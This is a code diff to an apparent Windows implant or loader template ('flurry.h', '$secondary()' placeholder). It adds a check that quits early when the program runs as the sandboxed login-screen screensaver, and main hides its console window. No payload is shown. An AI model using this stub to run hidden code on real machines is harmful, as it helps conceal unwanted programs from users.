@@ -53,17 +53,49 @@
 #define NOVIRTUALKEYCODES
 #define WIN32_LEAN_AND_MEAN
 
-#define EXPORT __declspec(dllexport)
-
 #include <winsock.h>
 #include <windows.h>
 
 #include "flurry.h"
 
+int isLoginScreen() {
+    // NOTE(dij): The login screen screensaver is sandboxed (good job Microsoft!)
+    //            and runs as LocalService. It /always/ runs under winlogon.exe
+    //            but only runs under the user when logged in.
+    //            The sandboxed one has no permissions so it hangs trying to do
+    //            something. So we should fail quickly if we can detect:
+    //             1. We're a screensaver (filepath ends in ".scr")
+    //             2. If we're running in the well known SID for LocalService.
+    //            The code below accomplishes this and returns '1/TRUE' if we're
+    //            the login screensaver.
+    WCHAR s[MAX_PATH];
+    int n = GetModuleFileNameW(NULL, (LPWSTR)s, MAX_PATH);
+    if (n <= 4 || s[n-4] != '.' || s[n-3] != 's' || s[n-2] != 'c' || s[n-1] != 'r') {
+        return 0;
+    }
+    HANDLE t;
+    if (!OpenProcessToken(GetCurrentProcess(), 0x8, &t)) {
+        return 0;
+    }
+    DWORD c;
+    int r = 0;
+    unsigned char b[256];
+    if (GetTokenInformation(t, 1, &b, 256, &c) && c > 0) {
+        r = IsWellKnownSid(((PTOKEN_USER)&b)->User.Sid, 0x17);
+    }
+    CloseHandle(t);
+    return r;
+}
 int main(int argc, char *argv[]) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
+    }
+    // NOTE(dij): Check screensaver when args are just two.
+    //            IE: <file> /s
+    //                ^ That's how screensavers are triggered in Windows.
+    if (argc == 2 && isLoginScreen()) {
+        return 0;
     }
     if (argc > 2) {
         $secondary();
